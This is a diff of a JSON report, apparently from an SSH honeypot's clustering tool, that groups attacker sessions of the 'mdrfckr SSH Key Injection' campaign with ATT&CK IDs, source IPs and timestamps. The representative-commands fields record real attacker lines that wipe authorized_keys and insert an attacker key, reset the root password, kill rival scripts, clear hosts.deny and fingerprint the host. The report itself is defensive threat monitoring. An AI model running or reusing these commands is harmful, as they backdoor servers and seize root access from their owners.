@@ -1,8 +1,8 @@
 {
-  "generated_at": "2026-06-01T04:23:42.191934+00:00",
-  "total_sessions_with_commands": 12,
-  "total_clusters": 3,
-  "campaign_clusters": 2,
+  "generated_at": "2026-06-01T11:41:33.280471+00:00",
+  "total_sessions_with_commands": 86,
+  "total_clusters": 4,
+  "campaign_clusters": 3,
   "singleton_clusters": 2,
   "highest_severity": "HIGH",
   "active_campaigns": [
@@ -10,8 +10,8 @@
       "cluster_id": "CLU-001",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
+      "session_count": 12,
+      "unique_ip_count": 4,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -21,6 +21,7 @@
         "T1070",
         "T1140",
         "T1547",
+        "T1489",
         "T1105"
       ]
     },
@@ -28,8 +29,24 @@
       "cluster_id": "CLU-002",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 10,
-      "unique_ip_count": 7,
+      "session_count": 1,
+      "unique_ip_count": 1,
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1082",
+        "T1592",
+        "T1070",
+        "T1140",
+        "T1105"
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "name": "mdrfckr SSH Key Injection",
+      "severity": "HIGH",
+      "session_count": 72,
+      "unique_ip_count": 22,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -60,12 +77,15 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 1,
+      "session_count": 12,
       "unique_ips": [
-        "180.76.234.93"
+        "121.15.140.235",
+        "114.80.32.225",
+        "114.254.1.141",
+        "104.28.233.73"
       ],
-      "unique_ip_count": 1,
-      "sequence_hash": "29de21a49328c6ab",
+      "unique_ip_count": 4,
+      "sequence_hash": "10402e270eba984b",
       "ttps": [
         {
           "id": "T1021.004",
@@ -100,6 +120,10 @@
           "name": "Boot/Logon Autostart"
         },
         {
+          "id": "T1489",
+          "name": "Service Stop"
+        },
+        {
           "id": "T1105",
           "name": "T1105"
         }
@@ -108,22 +132,110 @@
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
         "cat /proc/cpuinfo | grep name | wc -l",
-        "echo \"root:GRJR8vmg2U0L\"|chpasswd|bash",
+        "echo \"root:8GCCXXGiN2y7\"|chpasswd|bash",
+        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
         "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
         "ls -lh $(which ls)",
         "which ls",
-        "crontab -l",
-        "w"
+        "crontab -l"
       ],
       "members": [
         {
-          "session_id": "IR-b6979d63a57b",
-          "src_ip": "180.76.234.93",
+          "session_id": "IR-a27d163f4e05",
+          "src_ip": "114.254.1.141",
           "country": "",
           "isp": "",
-          "command_count": 18,
-          "timestamp": "2026-06-01T00:43:35.408443Z"
+          "command_count": 19,
+          "timestamp": "2026-06-01T04:36:55.421203Z"
+        },
+        {
+          "session_id": "IR-79974da002ce",
+          "src_ip": "114.254.1.141",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T04:40:34.037046Z"
+        },
+        {
+          "session_id": "IR-a72ed8404bcd",
+          "src_ip": "104.28.233.73",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T05:27:55.385826Z"
+        },
+        {
+          "session_id": "IR-512faf7256e5",
+          "src_ip": "104.28.233.73",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T05:34:44.028658Z"
+        },
+        {
+          "session_id": "IR-e21dfb323da2",
+          "src_ip": "104.28.233.73",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T05:43:46.333095Z"
+        },
+        {
+          "session_id": "IR-eeaf0ad5cd52",
+          "src_ip": "104.28.233.73",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T05:48:24.763108Z"
+        },
+        {
+          "session_id": "IR-6296c12cf1a5",
+          "src_ip": "121.15.140.235",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T07:05:24.851499Z"
+        },
+        {
+          "session_id": "IR-bb1192909e47",
+          "src_ip": "121.15.140.235",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T07:07:57.103906Z"
+        },
+        {
+          "session_id": "IR-45d4de49bb8b",
+          "src_ip": "121.15.140.235",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T07:10:31.580824Z"
+        },
+        {
+          "session_id": "IR-5c571c7da29e",
+          "src_ip": "121.15.140.235",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T07:13:03.855821Z"
+        },
+        {
+          "session_id": "IR-14678c30511c",
+          "src_ip": "121.15.140.235",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T07:18:06.300962Z"
+        },
+        {
+          "session_id": "IR-a51fae8262a5",
+          "src_ip": "114.80.32.225",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-06-01T10:22:31.620465Z"
         }
       ]
     },
@@ -147,17 +259,105 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 10,
+      "session_count": 1,
       "unique_ips": [
-        "47.242.210.146",
-        "103.67.78.132",
-        "185.239.85.154",
-        "47.242.27.65",
-        "156.232.13.218",
-        "172.185.24.228",
-        "106.38.205.224"
+        "163.53.168.23"
       ],
-      "unique_ip_count": 7,
+      "unique_ip_count": 1,
+      "sequence_hash": "d73e818bd1405a4f",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "cat /proc/cpuinfo | grep name | wc -l",
+        "echo \"root:2jrEVox7zdyb\"|chpasswd|bash"
+      ],
+      "members": [
+        {
+          "session_id": "IR-c466538a4fb2",
+          "src_ip": "163.53.168.23",
+          "country": "",
+          "isp": "",
+          "command_count": 4,
+          "timestamp": "2026-06-01T05:11:29.783995Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": true,
+      "campaign_name": "mdrfckr SSH Key Injection",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+      "matched_campaigns": [
+        {
+          "name": "mdrfckr SSH Key Injection",
+          "ttps": [
+            "T1021.004",
+            "T1078",
+            "T1105"
+          ],
+          "severity": "HIGH",
+          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+          "pattern_hits": 3,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 72,
+      "unique_ips": [
+        "18.144.3.82",
+        "102.88.137.80",
+        "187.212.47.18",
+        "116.125.120.27",
+        "64.188.83.134",
+        "71.80.194.137",
+        "138.197.200.106",
+        "34.100.254.191",
+        "40.121.200.75",
+        "64.188.77.26",
+        "104.28.233.73",
+        "114.80.32.225",
+        "198.154.207.145",
+        "113.161.222.150",
+        "34.78.29.97",
+        "118.39.234.65",
+        "103.175.225.238",
+        "92.30.242.95",
+        "101.126.157.138",
+        "118.193.44.184",
+        "102.88.137.145",
+        "161.49.89.39"
+      ],
+      "unique_ip_count": 22,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -187,89 +387,585 @@
       ],
       "members": [
         {
-          "session_id": "IR-cf45acf6fff4",
-          "src_ip": "103.67.78.132",
+          "session_id": "IR-d97bc471b390",
+          "src_ip": "18.144.3.82",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T00:44:04.887500Z"
+          "timestamp": "2026-06-01T05:12:14.943799Z"
         },
         {
-          "session_id": "IR-887aaeba992c",
-          "src_ip": "185.239.85.154",
+          "session_id": "IR-ef474d81ad49",
+          "src_ip": "40.121.200.75",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T00:48:02.610188Z"
+          "timestamp": "2026-06-01T05:19:05.980022Z"
         },
         {
-          "session_id": "IR-c6ccd420ab3e",
-          "src_ip": "156.232.13.218",
+          "session_id": "IR-9a6bf7737a9f",
+          "src_ip": "64.188.77.26",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T01:25:28.184530Z"
+          "timestamp": "2026-06-01T05:21:23.276612Z"
         },
         {
-          "session_id": "IR-03347d1a0c22",
-          "src_ip": "47.242.210.146",
+          "session_id": "IR-c21f0f669cd4",
+          "src_ip": "118.39.234.65",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T02:03:20.091515Z"
+          "timestamp": "2026-06-01T05:21:25.695118Z"
         },
         {
-          "session_id": "IR-ebaeae2e3f9d",
-          "src_ip": "106.38.205.224",
+          "session_id": "IR-ecefd7b21f3b",
+          "src_ip": "34.78.29.97",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T02:07:44.303652Z"
+          "timestamp": "2026-06-01T05:21:30.490396Z"
         },
         {
-          "session_id": "IR-9d6238e930ce",
-          "src_ip": "106.38.205.224",
+          "session_id": "IR-f5e69c74f0d7",
+          "src_ip": "40.121.200.75",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T02:09:21.497532Z"
+          "timestamp": "2026-06-01T05:22:10.197990Z"
         },
         {
-          "session_id": "IR-ebdbc40b6b6a",
-          "src_ip": "47.242.27.65",
+          "session_id": "IR-1dec23b4f25c",
+          "src_ip": "64.188.77.26",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T02:11:36.102088Z"
+          "timestamp": "2026-06-01T05:22:44.772762Z"
         },
         {
-          "session_id": "IR-e6849bd3c047",
-          "src_ip": "172.185.24.228",
+          "session_id": "IR-548660ee04f5",
+          "src_ip": "118.39.234.65",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T02:47:28.712958Z"
+          "timestamp": "2026-06-01T05:23:07.003925Z"
         },
         {
-          "session_id": "IR-e610759f3fc0",
-          "src_ip": "172.185.24.228",
+          "session_id": "IR-3fe6c72196b8",
+          "src_ip": "34.78.29.97",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T02:52:26.231167Z"
+          "timestamp": "2026-06-01T05:24:03.088201Z"
         },
         {
-          "session_id": "IR-cb9ab0bff9fe",
-          "src_ip": "172.185.24.228",
+          "session_id": "IR-0a182f431fb9",
+          "src_ip": "118.39.234.65",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-01T03:01:04.670013Z"
+          "timestamp": "2026-06-01T05:24:49.367318Z"
+        },
+        {
+          "session_id": "IR-202f266372fe",
+          "src_ip": "103.175.225.238",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:25:09.194331Z"
+        },
+        {
+          "session_id": "IR-be0cc4b08188",
+          "src_ip": "34.78.29.97",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:25:20.832095Z"
+        },
+        {
+          "session_id": "IR-cd3b509b54c4",
+          "src_ip": "34.78.29.97",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:26:37.368155Z"
+        },
+        {
+          "session_id": "IR-bc62f467f83c",
+          "src_ip": "118.39.234.65",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:26:43.087719Z"
+        },
+        {
+          "session_id": "IR-741048bcc87b",
+          "src_ip": "34.78.29.97",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:27:50.762828Z"
+        },
+        {
+          "session_id": "IR-dc64a67ad4cb",
+          "src_ip": "64.188.77.26",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:28:07.046783Z"
+        },
+        {
+          "session_id": "IR-7d4575b2fb31",
+          "src_ip": "118.39.234.65",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:28:18.512139Z"
+        },
+        {
+          "session_id": "IR-f1a475b08d8b",
+          "src_ip": "40.121.200.75",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:28:50.305794Z"
+        },
+        {
+          "session_id": "IR-33b163d86626",
+          "src_ip": "64.188.77.26",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:29:27.751809Z"
+        },
+        {
+          "session_id": "IR-7642b0f6797f",
+          "src_ip": "118.39.234.65",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:29:57.348088Z"
+        },
+        {
+          "session_id": "IR-ae5d1bf7b0f8",
+          "src_ip": "40.121.200.75",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:32:17.017681Z"
+        },
+        {
+          "session_id": "IR-f66b231c96f4",
+          "src_ip": "118.39.234.65",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:33:21.465919Z"
+        },
+        {
+          "session_id": "IR-e6fbd73f4286",
+          "src_ip": "64.188.77.26",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:33:40.736146Z"
+        },
+        {
+          "session_id": "IR-4a898114be4f",
+          "src_ip": "40.121.200.75",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:33:52.273231Z"
+        },
+        {
+          "session_id": "IR-b36d621687e4",
+          "src_ip": "34.78.29.97",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:34:28.370466Z"
+        },
+        {
+          "session_id": "IR-c258db2bc654",
+          "src_ip": "104.28.233.73",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:36:55.914894Z"
+        },
+        {
+          "session_id": "IR-d51c152d685f",
+          "src_ip": "64.188.77.26",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:37:50.149332Z"
+        },
+        {
+          "session_id": "IR-354dbe7e90f4",
+          "src_ip": "40.121.200.75",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T05:38:57.169493Z"
+        },
+        {
+          "session_id": "IR-9dc8cb74f01d",
+          "src_ip": "116.125.120.27",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T06:42:11.071177Z"
+        },
+        {
+          "session_id": "IR-bf14fb8e28dd",
+          "src_ip": "138.197.200.106",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:03:43.200311Z"
+        },
+        {
+          "session_id": "IR-0c41cdc2eb4a",
+          "src_ip": "161.49.89.39",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:04:07.220407Z"
+        },
+        {
+          "session_id": "IR-1ecf42f6ef37",
+          "src_ip": "138.197.200.106",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:11:55.312385Z"
+        },
+        {
+          "session_id": "IR-f105b4dbdefc",
+          "src_ip": "138.197.200.106",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:14:32.158854Z"
+        },
+        {
+          "session_id": "IR-68b1f5b0d532",
+          "src_ip": "138.197.200.106",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:17:08.676669Z"
+        },
+        {
+          "session_id": "IR-2c7a62d3d8d3",
+          "src_ip": "71.80.194.137",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:24:53.421174Z"
+        },
+        {
+          "session_id": "IR-ef113b7398be",
+          "src_ip": "71.80.194.137",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:27:04.013040Z"
+        },
+        {
+          "session_id": "IR-1aaed6fca036",
+          "src_ip": "71.80.194.137",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:28:41.098790Z"
+        },
+        {
+          "session_id": "IR-2c87a5d0eceb",
+          "src_ip": "71.80.194.137",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:30:17.137989Z"
+        },
+        {
+          "session_id": "IR-2f3578a3dfee",
+          "src_ip": "71.80.194.137",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:31:55.105138Z"
+        },
+        {
+          "session_id": "IR-59b722cb25b2",
+          "src_ip": "71.80.194.137",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:33:30.904196Z"
+        },
+        {
+          "session_id": "IR-465479331c59",
+          "src_ip": "71.80.194.137",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:35:04.213883Z"
+        },
+        {
+          "session_id": "IR-e0318cbfe82d",
+          "src_ip": "71.80.194.137",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:38:13.731328Z"
+        },
+        {
+          "session_id": "IR-0ee366446fce",
+          "src_ip": "113.161.222.150",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T07:40:19.546103Z"
+        },
+        {
+          "session_id": "IR-73a48ae150a8",
+          "src_ip": "92.30.242.95",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T08:14:54.924618Z"
+        },
+        {
+          "session_id": "IR-66955246e04c",
+          "src_ip": "102.88.137.145",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:28:59.840276Z"
+        },
+        {
+          "session_id": "IR-12e6a2e64306",
+          "src_ip": "102.88.137.80",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:31:38.580307Z"
+        },
+        {
+          "session_id": "IR-f022d41bfe45",
+          "src_ip": "64.188.83.134",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:37:10.737968Z"
+        },
+        {
+          "session_id": "IR-e2294cb8c85a",
+          "src_ip": "187.212.47.18",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:49:06.078246Z"
+        },
+        {
+          "session_id": "IR-dd90650b3783",
+          "src_ip": "187.212.47.18",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:51:50.522407Z"
+        },
+        {
+          "session_id": "IR-4dc54b8d3966",
+          "src_ip": "198.154.207.145",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:51:51.621077Z"
+        },
+        {
+          "session_id": "IR-89fcd7700d01",
+          "src_ip": "198.154.207.145",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:53:34.683622Z"
+        },
+        {
+          "session_id": "IR-2c2e4cd2ae15",
+          "src_ip": "187.212.47.18",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:54:08.478271Z"
+        },
+        {
+          "session_id": "IR-734647757d37",
+          "src_ip": "198.154.207.145",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:55:40.690367Z"
+        },
+        {
+          "session_id": "IR-d8e01657c059",
+          "src_ip": "187.212.47.18",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:56:34.181317Z"
+        },
+        {
+          "session_id": "IR-04597749c996",
+          "src_ip": "198.154.207.145",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:57:29.495774Z"
+        },
+        {
+          "session_id": "IR-036bb363fd38",
+          "src_ip": "198.154.207.145",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:59:09.109578Z"
+        },
+        {
+          "session_id": "IR-1d215c4b64f3",
+          "src_ip": "187.212.47.18",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T09:59:16.212030Z"
+        },
+        {
+          "session_id": "IR-5c87797d6f5a",
+          "src_ip": "198.154.207.145",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T10:00:40.639958Z"
+        },
+        {
+          "session_id": "IR-4cc4e57c4f5d",
+          "src_ip": "187.212.47.18",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T10:02:31.908302Z"
+        },
+        {
+          "session_id": "IR-a2c1f50e90d4",
+          "src_ip": "187.212.47.18",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T10:02:50.049770Z"
+        },
+        {
+          "session_id": "IR-5afad16d764d",
+          "src_ip": "198.154.207.145",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T10:03:57.904938Z"
+        },
+        {
+          "session_id": "IR-0fd7ea348974",
+          "src_ip": "187.212.47.18",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T10:06:06.251112Z"
+        },
+        {
+          "session_id": "IR-d77c42522ee9",
+          "src_ip": "114.80.32.225",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T10:25:25.327118Z"
+        },
+        {
+          "session_id": "IR-a5fb2828c49e",
+          "src_ip": "101.126.157.138",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T11:00:30.813076Z"
+        },
+        {
+          "session_id": "IR-df19d73e975e",
+          "src_ip": "118.193.44.184",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T11:04:44.351294Z"
+        },
+        {
+          "session_id": "IR-a47341561acb",
+          "src_ip": "34.100.254.191",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T11:07:35.810439Z"
+        },
+        {
+          "session_id": "IR-816b5e3d85ad",
+          "src_ip": "34.100.254.191",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T11:09:31.942782Z"
+        },
+        {
+          "session_id": "IR-e02739fd9acf",
+          "src_ip": "34.100.254.191",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T11:11:13.951984Z"
+        },
+        {
+          "session_id": "IR-d97b8d1f3710",
+          "src_ip": "34.100.254.191",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T11:13:04.243983Z"
+        },
+        {
+          "session_id": "IR-819ae77dcd88",
+          "src_ip": "34.100.254.191",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T11:19:54.392961Z"
+        },
+        {
+          "session_id": "IR-338238c21c06",
+          "src_ip": "34.100.254.191",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T11:21:47.873322Z"
+        },
+        {
+          "session_id": "IR-a8827f737212",
+          "src_ip": "34.100.254.191",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-06-01T11:26:56.484185Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-003",
+      "cluster_id": "CLU-004",
       "is_campaign": false,
       "campaign_name": null,
       "campaign_severity": null,
@@ -277,27 +973,22 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "106.38.205.224"
+        "172.191.151.49"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "c32b4937ce8564ea",
-      "ttps": [
-        {
-          "id": "T1021.004",
-          "name": "Remote Services: SSH"
-        }
-      ],
+      "sequence_hash": "32fbe00e2c2e4036",
+      "ttps": [],
       "representative_commands": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh"
+        "ssh -V"
       ],
       "members": [
         {
-          "session_id": "IR-7bc69093baf2",
-          "src_ip": "106.38.205.224",
+          "session_id": "IR-6e9023e3d0d6",
+          "src_ip": "172.191.151.49",
           "country": "",
           "isp": "",
           "command_count": 1,
-          "timestamp": "2026-06-01T02:08:05.109633Z"
+          "timestamp": "2026-06-01T05:57:02.243374Z"
         }
       ]
     }
